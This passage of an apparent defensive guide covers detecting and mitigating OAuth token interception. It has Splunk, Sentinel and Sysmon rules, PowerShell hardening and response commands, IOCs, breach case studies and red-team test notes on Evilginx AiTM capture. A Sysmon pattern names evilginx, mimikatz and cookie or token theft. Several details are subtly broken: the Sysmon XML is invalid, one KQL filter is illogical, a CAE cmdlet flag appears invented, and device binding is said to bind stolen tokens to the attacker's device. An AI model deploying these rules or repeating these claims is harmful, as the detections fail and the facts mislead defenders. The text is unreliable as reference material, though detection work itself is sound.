| rename userPrincipalName as user, IPAddress as source_ips, sessionId as session_id 
| table _time, user, source_ips, country_count, ip_count
```

**What This Detects:**
- Same session ID used from different IP addresses (session hijacking indicator).
- Multiple countries or IPs within 30 minutes = impossible travel or token replay.

**Manual Configuration Steps:**

1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste SPL query
5. Set **Trigger Condition** to: Custom → `search | stats count | where count > 0`
6. Configure **Action** → Email to SOC team
7. Save as: "OAuth Session Hijacking - Multiple IPs"

**False Positive Analysis:**
- **Legitimate Activity:** VPN usage, mobile switching (WiFi → cellular).
- **Tuning:** Exclude known VPN subnets: `| search NOT (IPAddress IN (10.0.0.0/8, ...))`

---

### Rule 2: OAuth Token Exchange from Unusual Source IP

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:audit
- **Fields:** OperationName, InitiatedBy.User.Id, Resource.DisplayName, IPAddress, TokenIssuanceContext
- **Alert Threshold:** Token issued from IP never seen for this user (past 30 days)
- **Applies To Versions:** All

**SPL Query:**

```spl
index=azure_activity source=AuditLogs OperationName="Add OAuth client" OR OperationName="Update OAuth client" 
OR OperationName="Authorize OAuth client" 
| stats values(IPAddress) as new_ips by InitiatedBy.User.Id, InitiatedBy.User.UserPrincipalName 
| join InitiatedBy.User.Id [search index=azure_activity source=AuditLogs earliest=-30d 
OperationName="Add OAuth client" OR OperationName="Update OAuth client" 
| stats values(IPAddress) as historical_ips by InitiatedBy.User.Id] 
| eval is_new_ip=if(match(new_ips, historical_ips), "no", "yes") 
| search is_new_ip=yes
```

**What This Detects:**
- OAuth token issued from IP not previously associated with user.
- High-risk indicator of token theft from external attacker or compromised device.

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Session Token Reuse Across Multiple IPs & Geos

**Rule Configuration:**
- **Required Table:** SigninLogs, CloudAppEvents
- **Required Fields:** sessionId, userPrincipalName, IPAddress, Location, AuthenticationDetails.AuthenticationMethod
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All

**KQL Query:**

```kusto
SigninLogs
| where ResultType == 0  // Successful logins only
| summarize
    IPAddresses=make_set(IPAddress),
    Countries=make_set(Location.CountryOrRegion),
    UserAgents=make_set(UserAgent),
    FirstTime=min(TimeGenerated),
    LastTime=max(TimeGenerated),
    LoginCount=count()
    by sessionId, UserPrincipalName, UserId
| where array_length(IPAddresses) >= 2  // Same session from multiple IPs
| where array_length(Countries) >= 2    // Multiple countries
| extend
    TimeDiff_Minutes=datetime_diff('minute', LastTime, FirstTime),
    SourceIPs=IPAddresses
| where TimeDiff_Minutes <= 30  // Within 30 minutes = impossible travel
| project
    TimeGenerated=FirstTime,
    UserPrincipalName,
    SessionId=sessionId,
    SourceIPs,
    Countries,
    ImpossibleTravelMinutes=TimeDiff_Minutes,
    RiskLevel="HIGH"
```

**What This Detects:**
- Session token reused from multiple IP addresses and countries within short timeframe.
- Strong indicator of token hijacking or AiTM phishing bypass.

**Manual Configuration Steps:**

1. **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `OAuth Session Token Hijacking Detection`
   - Severity: `High`
3. **Set rule logic Tab:**
   - Paste KQL query
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
4. **Incident settings Tab:** Enable incident creation
5. **Create**

---

### Query 2: Open Redirect via redirect_uri Parameter Abuse

**Rule Configuration:**
- **Required Table:** CloudAppEvents, AADGraphActivityLogs
- **Required Fields:** RequestUri, RequestBody, InitiatedBy
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All

**KQL Query:**

```kusto
AADGraphActivityLogs
| where OperationName startswith "Authorize" or OperationName startswith "GetAuthorizationCode"
| extend
    RedirectUri=extract(@'redirect_uri[=:]([^&\s"]+)', 1, RequestUri),
    ClientId=extract(@'client_id[=:]([^&\s"]+)', 1, RequestUri)
| where RedirectUri !startswith "https://" or
        RedirectUri contains ".." or  // Directory traversal
        RedirectUri contains "%2e%2e" or
        RedirectUri !contains OperationName  // Redirect doesn't match registered app
| project
    TimeGenerated,
    UserPrincipalName=InitiatedBy.User.UserPrincipalName,
    ClientId,
    RedirectUri,
    SuspiciousReason="Potential open redirect or URI manipulation",
    RequestUri,
    ResourceId
```

**What This Detects:**
- OAuth redirect_uri parameter contains directory traversal (`..`) or points to external domain.
- Application does not validate redirect_uri against registered list.

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (Account Logon Success)**

- **Log Source:** Security
- **Trigger:** OAuth token exchange resulting in successful authentication.
- **Filter:** "OAuth" in Process Name or Logon Type 9 (NewCredentials via AiTM).
- **Applies To Versions:** Server 2016-2025 with Kerberos/NTLM/OAuth logging.

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Expand **Logon/Logoff** → **Audit Logon**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows 10/11, Server 2019-2025.

```xml
<Sysmon schemaversion="4.1">
  <EventFiltering>
    <!-- Detect HTTPS traffic to OAuth endpoints from suspicious tools -->
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains">
        login.microsoftonline.com
        oauth.microsoftonline.com
      </DestinationHostname>
      <InitiatingProcessName condition="contains any">
        python.exe
        curl.exe
        powershell.exe
      </InitiatingProcessName>
    </NetworkConnect>

    <!-- Detect credential extraction tools used for token theft -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">
        evilginx
        mimikatz
        token
        cookie
        session
      </CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alerts

**Alert Name:** "Suspicious OAuth application consent"
- **Severity:** High
- **Description:** User granted permissions to OAuth app with unusual scopes (User.Read.All, Mail.ReadWrite).
- **Applies To:** All subscriptions with Defender for Cloud enabled.

**Alert Name:** "Impossible travel - OAuth token usage"
- **Severity:** Critical
- **Description:** OAuth token used from multiple geographic locations within short timeframe.
- **Applies To:** Defender for Cloud Apps enabled.

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: OAuth Token Exchange & Authorization Events

```powershell
Search-UnifiedAuditLog -Operations "Authorize","GrantAccess","OAuthAppConsentGrant" `
    -StartDate (Get-Date).AddDays(-7) `
    -EndDate (Get-Date) | 
    Select-Object UserIds, Operations, CreationDate, ResultIndex, @{
        N="GrantedScopes"
        E={($_.AuditData | ConvertFrom-Json).ModifiedProperties[0].NewValue}
    } | 
    Export-Csv -Path "C:\OAuth_Audit.csv"
```

- **Operation:** Authorize, GrantAccess, OAuthAppConsentGrant
- **Workload:** AzureActiveDirectory, Teams, Exchange
- **Applies To:** M365 E3+

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable Device-Bound Token Protection (PRT with Device Registration)**

Ensures stolen tokens are bound to attacker's device, preventing replay on different systems.

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Enforce Token Protection - Device Binding`
4. **Assignments:** All users, Cloud apps = Office 365 Exchange Online + Microsoft Teams + SharePoint Online
5. **Conditions:** Any device, any location
6. **Access controls:** **Require device to be marked as compliant** + **Require authentication strength → Passwordless sign-in**
7. Enable policy: **On**

**Manual Steps (PowerShell):**

```powershell
Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"

$policy = @{
    displayName = "Device-Bound Token Protection"
    state = "enabled"
    conditions = @{
        applications = @{ includeApplications = @("00000003-0000-0ff1-ce00-000000000000") }  # Office 365
        users = @{ includeUsers = @("All") }
    }
    grantControls = @{
        operator = "AND"
        builtInControls = @("compliantDevice", "approvedClientApp")
    }
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $policy
```

**Validation Command:**

```powershell
Get-MgIdentityConditionalAccessPolicy -Filter "displayName eq 'Device-Bound Token Protection'" |
    Select-Object DisplayName, State
```

---

**2. Implement Continuous Access Evaluation (CAE) - Real-Time Token Revocation**

CAE revokes tokens immediately when session conditions change (IP mismatch, device non-compliant, etc.).

**Manual Steps:**

1. Go to **Azure Portal** → **Entra ID** → **Monitoring** → **Continuous Access Evaluation**
2. Enable **Continuous Access Evaluation**
3. Configure **Token Revocation on Risk**: High, Medium
4. Configure **Session Persistence**: Require re-authentication every 1 hour for high-risk users

**PowerShell:**

```powershell
# Enable CAE for all tenants
Update-MgPolicyAuthenticationFlowsPolicy -EnableCAE $true
```

---

**3. Enforce Strict redirect_uri Validation & Block Open Redirects**

OAuth providers must validate redirect_uri against registered list (exact match required).

**Manual Steps (App Owner):**

1. Go to **Azure Portal** → **Entra ID** → **App registrations**
2. Select application
3. **Authentication** → **Redirect URIs**
4. **Remove** any wildcard URIs (*.company.com)
5. **Add** only exact, specific URIs (https://myapp.company.com/callback)
6. Enable **Require exact URI match**: Yes

**PowerShell (Validate all apps):**

```powershell
Connect-MgGraph -Scopes "Application.Read.All"

Get-MgApplication | ForEach-Object {
    $app = $_
    $redirectUris = $app.Web.RedirectUris
    
    foreach ($uri in $redirectUris) {
        if ($uri -contains "*" -or $uri -contains "..") {
            Write-Host "[WARNING] Insecure redirect_uri in app '$($app.DisplayName)': $uri"
        }
    }
}
```

---

**4. Revoke and Rotate Refresh Tokens on Suspected Compromise**

Immediately invalidate all existing tokens for compromised user.

**Manual Steps:**

1. **Azure Portal** → **Entra ID** → **Users** → Select compromised user
2. **Sign-in activity** → **Confirm user is compromised**
3. System automatically revokes all refresh tokens
4. User must re-authenticate (MFA required)

**PowerShell:**

```powershell
Connect-MgGraph -Scopes "User.ReadWrite.All"

$user = Get-MgUser -Filter "userPrincipalName eq 'compromised@contoso.com'"
Revoke-MgUserSignInSession -UserId $user.Id

Write-Host "[+] All refresh tokens revoked for $($user.UserPrincipalName)"
Write-Host "[+] User must re-authenticate on next access"
```

---

### Priority 2: HIGH

**5. Implement FIDO2 Security Keys (Phishing-Resistant MFA)**

FIDO2 keys cannot be phished; Evilginx/AiTM attacks fail even if credentials are captured.

**Manual Steps:**

1. **Azure Portal** → **Entra ID** → **Security** → **MFA** → **Enable FIDO2 Registration**
2. **Conditional Access** → **New policy**:
   - Require Grant: **Require FIDO2 registered device for all users**
3. Provide FIDO2 keys to users (e.g., YubiKeys)

---

**6. Enable Sign-In Anomaly Detection with Risk-Based Conditional Access**

Automatically block or require reauthentication for suspicious logins.

**Manual Steps:**

1. **Azure Portal** → **Entra ID** → **Security** → **Identity Protection**
2. **Sign-in risk policy**: Set to **Medium and above** → **Block**
3. **User risk policy**: Set to **Medium and above** → **Require secure password change**

---

**7. Monitor & Alert on Unusual OAuth Consent Grants**

Flag when users grant permissions to suspicious OAuth apps.

**Manual Steps:**

1. **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create alert**
2. **Query:** Monitor `AzureADGraphActivityLogs` for `OAuthAppConsentGrant` operations
3. **Alert on:** Apps requesting User.Read.All, Mail.ReadWrite, Chat.ReadWrite scopes from non-admin users

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network:**
- Connections to Evilginx/phishing domains (login-azure.com, office365-verify.com, etc.)
- Requests to login.microsoftonline.com from non-standard ports or proxies
- Large outbound data transfers following OAuth token issuance

**Cloud Logs:**
- `SigninLogs`: Same sessionId from multiple IPs/countries within 30 minutes
- `SigninLogs`: Successful MFA but from unusual IP (AiTM indicator)
- `AADGraphActivityLogs`: Unusual OAuth scopes granted (User.Read.All, Mail.ReadWrite)
- `MicrosoftGraphActivityLogs`: Bulk mailbox searches, mass file downloads

### Forensic Artifacts

**Sign-In Logs:**
- SessionId reuse across multiple IPs (session hijacking)
- MFA success but unusual UserAgent or browser (browser spoofing by AiTM)
- Impossible travel (login from two distant locations too close together)

**OAuth & Audit Logs:**
- OAuthAppConsentGrant with suspicious scopes
- UnauthorizedAccess attempts preceded by successful OAuth consent
- Token refresh operations from unusual IP addresses

### Response Procedures

1. **Isolate:** Immediately revoke all refresh tokens for compromised user
   ```powershell
   Revoke-MgUserSignInSession -UserId (Get-MgUser -Filter "userPrincipalName eq 'user@contoso.com'").Id
   ```

2. **Collect Evidence:**
   ```powershell
   # Export sign-in logs for forensics
   Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'user@contoso.com' and createdDateTime gt 2025-01-08T00:00:00Z" |
       Export-Csv -Path "C:\Forensics\SignInLog.csv"
   ```

3. **Remediate:**
   - Force password reset
   - Revoke all OAuth app consents
   - Review and remove any suspicious app registrations
   - Re-enroll in MFA (especially FIDO2)

4. **Notify:**
   - Inform user of compromise
   - Review what data was accessed (emails, files, Teams conversations)
   - Check for lateral movement (OAuth apps with User.Read.All that accessed other accounts)

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker tricks user into granting OAuth permissions |
| **2** | **Credential Access** | [CA-PHISH-001] Device Code Phishing | Attacker uses device code flow to obtain tokens |
| **3** | **Current Step** | **[CA-TOKEN-005]** | **OAuth Access Token Interception (this technique)** |
| **4** | **Impact** | [CA-UNSC-003] SYSVOL GPP Credential Extraction | Attacker searches mailbox for other credentials |
| **5** | **Persistence** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Attacker registers persistent OAuth app |
| **6** | **Exfiltration** | [CA-TOKEN-004] Graph API Token Theft | Attacker extracts sensitive data via stolen token |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: Salesloft/Drift OAuth Supply Chain Breach (August 2025)

- **Target:** SaaS companies using Drift chatbot (owned by Salesloft)
- **Timeline:** August 2025
- **Attack Method:** OAuth token theft → lateral movement to customer SaaS environments
- **Technical Details:**
  1. Attackers compromised Salesloft infrastructure
  2. Stole OAuth tokens for integrations with Salesforce, Google Workspace, Microsoft 365
  3. Used stolen tokens to access hundreds of customer organizations without detection (tokens appeared legitimate)
  4. Exfiltrated customer data, email conversations, sales records
- **Impact:** 500K+ OAuth tokens compromised; affected Salesforce, Google, Microsoft 365 customers
- **Detection:** OAuth token usage from unusual IP addresses (attackers' command & control infrastructure)
- **Lesson:** OAuth token theft is harder to detect than credential compromise (appears legitimate; no password required)
- **Reference:** [Iron Core Labs - OAuth Breach Analysis](https://ironcorelabs.com/blog/2025/oath-token-tragedy/)

### Example 2: Tycoon 2FA AiTM Persistent OAuth Attack (2025)

- **Target:** Enterprise M365 users
- **Timeline:** October 2025 - Present
- **Attack Method:** Evilginx2 MITM → MFA bypass → Session token theft → OAuth app persistence
- **Technical Details:**
  1. Attacker sends phishing email with Evilginx login URL
  2. User enters credentials on fake login page; Evilginx relays to real Microsoft
  3. User completes MFA; Evilginx intercepts session token
  4. Attacker uses session token to create persistent OAuth app with User.Read.All, Mail.ReadWrite scopes
  5. OAuth app grants indefinite access even after user changes password/MFA
- **Impact:** MFA bypass, persistent access, full mailbox/Teams access, lateral movement to other users
- **Detection Failures:** MFA was satisfied (Entra ID logs show successful MFA); session hijacking difficult to detect without device-bound tokens
- **Detection Success:** ML-based anomaly detection flagging session reuse across IPs (with offset in time)
- **Lesson:** Device-bound tokens and CAE are critical; MFA alone is insufficient against AiTM
- **Reference:** [Freemindtronic - Tycoon 2FA Persistent OAuth Flaw](https://freemindtronic.com/persistent-oauth-flaw-tycoon-2fa-en/)

### Example 3: APT29 OAuth Token Abuse (2023-2025)

- **Target:** NGOs, diplomats, government agencies, M365 administrators
- **Timeline:** 2023-2025 (ongoing)
- **Attack Method:** OAuth consent hijacking via phishing → token theft → lateral movement
- **Technical Details:**
  1. Spear-phishing email with link to malicious OAuth app (e.g., "Microsoft Account Manager")
  2. User clicks and authorizes; OAuth app receives token with User.Read.All, Mail.ReadWrite, Chat.ReadWrite
  3. APT29 uses token to search for and exfiltrate sensitive intelligence from mailboxes/Teams
  4. Long token lifetime (days/weeks) enables sustained access
- **Impact:** Long-term intelligence gathering, lateral movement to high-value targets (diplomats, government officials)
- **Detection:** Unusual OAuth app consent grants; bulk mailbox searches for keywords (sensitive, classified, secret, etc.)
- **Reference:** [Microsoft Threat Intelligence - APT29 Activities](https://www.microsoft.com/en-us/security/blog/)

---

## 17. OPERATIONAL NOTES & ADDITIONAL RECOMMENDATIONS

### Why OAuth Token Interception Remains ACTIVE:

1. **AiTM is design-resistant:** Evilginx can intercept any OAuth flow (even those with CSRF protections).
2. **MFA is bypassed:** User already authenticated with real OAuth provider; MFA challenge does not re-trigger.
3. **Session tokens are powerful:** Single token grants access to all resources user consented to.
4. **Refresh tokens enable persistence:** Even after user changes password, refresh token remains valid.

### Recommended Defensive Posture:

- **Shift to phishing-resistant MFA:** FIDO2 keys make AiTM attacks impossible (biometric/hardware binding).
- **Enforce device-bound tokens:** PRT with device registration prevents stolen tokens from being replayed on different devices.
- **Implement CAE:** Immediately revoke tokens when conditions change (IP mismatch, non-compliant device, etc.).
- **Strict redirect_uri validation:** Exact match, no wildcards, no open redirects.
- **Monitor OAuth consent grants:** Flag unusual scopes (User.Read.All, Mail.ReadWrite) granted to non-admin users.
- **Alert on session reuse:** Same sessionId from multiple IPs/countries = immediate investigation.

### Testing & Validation in Red Team Exercises:

1. **Test open redirect** with legitimate app; verify Evilginx can capture tokens
2. **Simulate AiTM attack** with controlled phishing email; measure detection time
3. **Verify CAE effectiveness** by testing token revocation on IP change
4. **Assess FIDO2 security** by attempting Evilginx attack against FIDO2-protected account (should fail)

---
